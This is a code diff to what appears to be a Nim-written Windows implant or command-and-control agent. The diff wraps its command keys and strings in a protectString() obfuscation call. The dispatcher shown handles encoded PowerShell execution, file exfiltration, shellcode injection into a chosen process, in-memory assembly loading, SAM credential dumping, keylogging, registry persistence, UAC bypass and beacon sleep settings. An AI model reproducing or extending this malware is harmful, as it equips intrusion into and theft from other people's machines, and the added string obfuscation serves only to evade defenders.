@@ -129,14 +129,14 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
     if ps_module == "":
         data = {
             protectString("powershell_command"): decode_64(encoded_powershell_command),
-            "output": output
+            protectString("output"): output
         }.toOrderedTable()
         is_success = post_data(client, protectString("iex"), $data)
     
     # command came from ps_module
     else:
         data = {
-            "output": output
+            protectString("output"): output
         }.toOrderedTable()
         is_success = post_data(client, ps_module, $data)
 
@@ -579,11 +579,11 @@ proc windows_parse_command*(command: JsonNode): bool =
                 is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr())
             # ps_modules
             else:
-                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command["ps_module"].getStr())
+                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command[protectString("ps_module")].getStr())
         of protectString("download"):
-            is_success = exfil_file(client, command["src_file"].getStr())
+            is_success = exfil_file(client, command[protectString("src_file")].getStr())
         of protectString("upload"):
-            is_success = write_file(client, command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr())            
+            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr())            
         of protectString("checksec"):
             is_success = checksec()
         of protectString("clipboard"):
@@ -597,9 +597,9 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("sam"):
             is_success = dump_sam()
         of protectString("shellc"):
-            is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command["pid"].getInt())
+            is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command[protectString("pid")].getInt())
         of protectString("assembly"):
-            is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
+            is_success = wrap_execute_assembly(command[protectString("assembly_base64")].getStr(), command[protectString("assembly_args")].getStr())
         of protectString("keylog"):
             var keylog_action = command[protectString("action")].getStr()
             if keylog_action == protectString("start"):
@@ -611,25 +611,25 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("patch"):
             is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
         of protectString("persist-run"):
-            is_success = set_run_key(command["key_name"].getStr(), command[protectString("persist_command")].getStr())
+            is_success = set_run_key(command[protectString("key_name")].getStr(), command[protectString("persist_command")].getStr())
         of protectString("persist-spe"):
             is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
         of protectString("uac-bypass"):
             is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr(), command[protectString("keep_or_die")].getStr())
         of protectString("msgbox"):
             # spawn in a new thread
-            var title = command["title"].getStr()
-            var text = command["text"].getStr()
+            var title = command[protectString("title")].getStr()
+            var text = command[protectString("text")].getStr()
             spawn msgbox(title, text)
             var data = {
                 protectString("msgbox_content"): "[" & title & "] " & text,
-                protectString("status"): "spawned in a new thread"
+                protectString("status"): protectString("spawned in a new thread")
                 }.toOrderedTable()
             discard post_data(client, protectString("msgbox") , $data)
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("sleep"):
-            is_success = change_sleep_time(client, command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
+            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
             is_success = collect_data()
         of protectString("kill"):
